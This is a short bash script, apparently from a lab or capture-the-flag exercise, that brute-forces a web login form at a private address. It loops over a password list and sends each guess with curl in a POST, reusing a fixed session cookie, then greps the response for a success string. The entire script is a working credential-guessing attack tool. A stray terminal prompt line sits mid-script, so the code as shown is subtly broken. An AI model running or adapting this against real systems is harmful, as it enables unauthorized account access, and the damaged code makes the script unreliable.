#!/bin/bash -x

if [ $# -lt 2 ]
then
	echo "Wrong number of arguments. Usage:"
	echo "	$0 user password_list_file"
	exit 1
fi

user=$1
passwordfile=$2

while read password;
do
	echo "trying $user / $password"
	databinary=$(echo "username=$user&password=$password")

└─$ 
	curl -i -s -k \
	-X $'POST' \
    	-H $'Host: 192.168.1.127' \
	-H $'Content-Length: 34' \
	-H $'Cache-Control: max-age=0' \
	-H $'Upgrade-Insecure-Requests: 1' \
	-H $'Origin: http://192.168.1.127' \
	-H $'Content-Type: application/x-www-form-urlencoded' \
	-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36' \
	-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
	-H $'Referer: http://192.168.1.127/monitoring/login.php' \
	-H $'Accept-Encoding: gzip, deflate' \
	-H $'Accept-Language: en-US,en;q=0.9' \
	-H $'Connection: close' \
    	-b $'PHPSESSID=hm183nnveqffc6qho1m16dvicu' \
    	--data-binary $databinary \
    	--output curloutput.txt \
    	$'http://192.168.1.127/monitoring/index.php'


	numlines=$(cat curloutput.txt | grep "Your Monitored Servers" | wc -l)
	echo "numero de lineas: $numlines"

	if [ $numlines -gt 0 ]
	then
		echo found: user $user, password $password
		exit 0
	fi

done < $passwordfile

echo no password found for user $user in file $passwordfile
exit 1
